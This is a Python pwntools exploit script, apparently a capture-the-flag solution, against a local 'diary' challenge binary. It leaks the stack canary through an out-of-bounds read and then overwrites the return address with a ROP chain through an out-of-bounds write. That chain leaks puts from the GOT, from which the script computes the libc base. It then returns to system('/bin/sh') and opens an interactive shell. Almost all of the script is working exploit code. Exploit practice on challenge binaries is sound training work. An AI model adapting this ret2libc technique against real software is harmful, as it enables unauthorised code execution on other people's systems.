#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template /var/challenges/diary/diary
from pwn import *
import time

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or '/var/challenges/diary/diary')
libc = ELF('/usr/lib/x86_64-linux-gnu/libc-2.31.so')  
rop = ROP(exe)


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# FORTIFY:    Enabled
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No
# Debuginfo:  Yes

puts_plt = exe.plt['puts']
puts_got = exe.got['puts']
print(f"puts is at address: {hex(puts_plt)}")

# Let puts print its own address
rop.call(puts_plt, [puts_got])

# Return to main to keep the program running
rop.call(exe.symbols['main'])
chain = rop.chain()

io = start()
io.sendline("2") # read entry
io.sendline("8") # read page 8 (out of bounds)
data = io.recvuntil("Content: ")

# Read canary
canary = data.split(b'Timestamp:')[1].replace(b" ", b"").replace(b"\n", b"").replace(b"Content:", b"").strip()
print("got canary: ", canary)

# Execute rop to leak puts address through GOT
io.sendline("1") # add entry
io.sendline("8") # write at page 8 (out of bounds)
io.sendline(8 * b"A" + chain) 
# io.sendline("2863311530") # timestamp, represents 0xAAAAAAAA
io.sendline(f'{int(canary, 16):d}') # canary
io.sendline("3") # trigger return

# data = io.recv(2048)
# print("Received: ", data)
# print(data.split(b'\n')[0])
# # Convert bytes to int
# puts_addr = int.from_bytes(data.split(b'\n')[0], byteorder='little')
# print("puts is at address: ", hex(puts_addr))

data = io.recv(timeout=0.2) # clear the first buffer
data = io.recv(timeout=0.2).split(b'\n')    

# Show all lines and line numbres
# for i, line in enumerate(data):
#     print(i, line)

# The interesting bytes (puts addr) are at line 6
puts_addr = int.from_bytes(data[6].replace(b"> ", b""), byteorder='little')
print("puts is at address: ", hex(puts_addr))

# Find libc base
puts_offset = libc.symbols['puts']
libc_base = puts_addr - puts_offset

# Find system and /bin/sh
system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh'))
print(f"System address: {hex(system_addr)}")
print(f"/bin/sh address: {hex(binsh_addr)}")

# Return to system()
rop2 = ROP(exe)
rop2.call(rop2.ret) # align stack
rop2.call(system_addr, [binsh_addr])
chain = rop2.chain()

# Execute rop to execute system
io.sendline("1") # add entry
io.sendline("8") # write at page 8 (out of bounds)
io.sendline(8 * b"A" + chain) 
io.sendline(f'{int(canary, 16):d}') # canary

input("Press Enter to continue...")

io.sendline("3") # trigger return

io.interactive()

